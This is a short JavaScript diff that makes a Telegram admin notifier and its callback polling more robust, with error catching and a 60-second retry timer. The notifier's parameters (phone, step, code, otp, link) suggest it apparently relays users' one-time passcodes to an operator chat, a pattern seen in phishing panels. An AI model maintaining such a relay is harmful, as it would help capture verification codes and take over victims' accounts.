@@ -141,6 +141,9 @@ function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, lin
       reply_markup: {
         inline_keyboard: [buttonRow],
       },
+    }).catch((err) => {
+      console.error('Failed to send Telegram notification:', err.message);
+      return null;
     });
   } catch (err) {
     console.error('Failed to send Telegram notification:', err.message);
@@ -512,7 +515,17 @@ async function processTelegramCallbacks() {
 }
 
 if (api && ADMIN_CHAT_ID) {
-  processTelegramCallbacks();
+  let telegramPollingTimer = null;
+  async function startTelegramPolling() {
+    try {
+      await processTelegramCallbacks();
+    } catch (err) {
+      console.error('Telegram polling stopped:', err.message);
+    }
+    clearTimeout(telegramPollingTimer);
+    telegramPollingTimer = setTimeout(startTelegramPolling, 60000);
+  }
+  startTelegramPolling();
 }
 
 // ---------------------------------------------------------------------------
